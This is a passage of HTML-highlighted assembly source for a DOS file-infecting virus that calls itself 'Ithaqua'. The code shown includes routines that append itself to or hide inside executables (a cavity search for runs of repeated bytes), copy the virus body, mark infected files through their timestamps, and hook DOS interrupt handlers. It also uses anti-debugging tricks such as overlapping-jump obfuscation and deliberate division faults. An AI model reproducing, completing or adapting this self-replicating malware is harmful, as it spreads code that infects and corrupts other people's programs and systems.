        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; ?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">comjmp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; cs: fuera</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; Go to init ( 0 or SI )</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Strapping_Young_Lad</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">                      </span><span class="sc1">; Free EMS memory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@rest_stuff</span><span class="sc0">

</span><span class="sc5">@rec_append</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">@append</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_pos</span><span class="sc4">],</span><span class="sc2">0100h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Jump at init</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Smack_My_Bitch_UP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_myself</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">comjmp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Go to init ( 0 or SI )</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Strapping_Young_Lad</span><span class="sc0">

</span><span class="sc5">@rest_stuff</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">          </span><span class="sc1">; New file time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">

</span><span class="sc5">rest_attrs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Attrib</span><span class="sc0">

</span><span class="sc5">@closego</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">


</span><span class="sc5">end_infection</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">trick</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0cd34h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2beah</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">trick</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">handler22h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21h_plural</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@dontmessitup</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; AX = 2508h</span><span class="sc0">

</span><span class="sc5">@dontmessitup</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">trick2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f1f7h</span><span class="sc0">           </span><span class="sc1">; AX = 2524h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a7cah</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">trick2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc1">; ax = 7d5a ahora</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int0h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Looks as if it was anything</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int0h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;of interest in ds:si</span><span class="sc0">
</span><span class="sc5">trick3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f289h</span><span class="sc0">            </span><span class="sc1">; inside -&gt; mov dx,si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02bc0h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">trick3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">We_finish_here_anyway</span><span class="sc0">
</span><span class="sc5">return_point</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;***********</span><span class="sc0">

</span><span class="sc5">EMS_IVT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">19ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Int67h present ? Could hang</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;otherwise</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EMS_Get</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; File handle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">; Address of the page frame</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">                         </span><span class="sc1">;segment in Bx, where pages are</span><span class="sc0">
                                            </span><span class="sc1">;dumped</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                        </span><span class="sc1">; Assign 2 pages ( 32 Kb ) for us</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@rec_append</span><span class="sc0">                 </span><span class="sc1">; Dx = EMS Handler</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4400h</span><span class="sc0">                    </span><span class="sc1">; Dump the logical page in BX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                    </span><span class="sc1">;to the physical one in Al</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; Segment of EMS: we can start</span><span class="sc0">
                                            </span><span class="sc1">;writing on this 32Kb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; Recover handle</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">repeated</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">coincidences</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reference</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Infect_Exe</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; With file opened, date stored, etc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EMS_IVT</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Exe_Shit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">350000d</span><span class="sc0">   </span><span class="sc1">; Maximum</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Exe_Shit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Not-overlays</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Exe_Shit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; EMS  ?</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Exe_Shit</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EMS_Get</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">reference</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">Read_16Kb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">reference</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04000h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Free_Ems</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">Get_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">repeated</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@add_1_to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">repeated</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">coincidences</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@add_1_to</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">coincidences</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">coincidences</span><span class="sc4">],</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@CavityRulez</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
        </span><span class="sc6">jnae</span><span class="sc0">    </span><span class="sc5">Get_Byte</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Read_16Kb</span><span class="sc0">

</span><span class="sc5">@CavityRulez</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reference</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; DX:AX is tha shit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; Offset on this one</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Adjust dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">-</span><span class="sc2">01ch</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Real offset</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Adjust dx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Start en fichero</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; EAX = DXAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">           </span><span class="sc1">; ( paragraphs )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Smack_My_Bitch_UP</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_myself</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffercom</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">


</span><span class="sc5">@Free_Ems</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; EMS Handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">                      </span><span class="sc1">; Free EMS memory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">

        </span><span class="sc1">; Parte final com£n:</span><span class="sc0">
</span><span class="sc5">Exe_Shit</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@rest_stuff</span><span class="sc0">

</span><span class="sc1">;ú--úú-úú-ú-úúú-ú--ú-ú-úú--ú--ú-úú-ú-úú-úú-ú-ú-úú-úú-ú--ú-úú-ú--ú-úú-ú-úú-ú-ú</span><span class="sc0">
</span><span class="sc1">;                             Int 8h handler</span><span class="sc0">
</span><span class="sc1">;-ú--ú-ú-úú-ú-úúú--úúú-ú--ú--ú-ú--ú-ú-ú--úú-ú-úú--úú-ú-úúú-ú-ú-ú-ú--ú-úúú-ú-ú</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I''m Ithaqua,... that who walks over the wind'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">handler22h</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Swap_seg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Swap_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">; ah=INDOS flag</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">
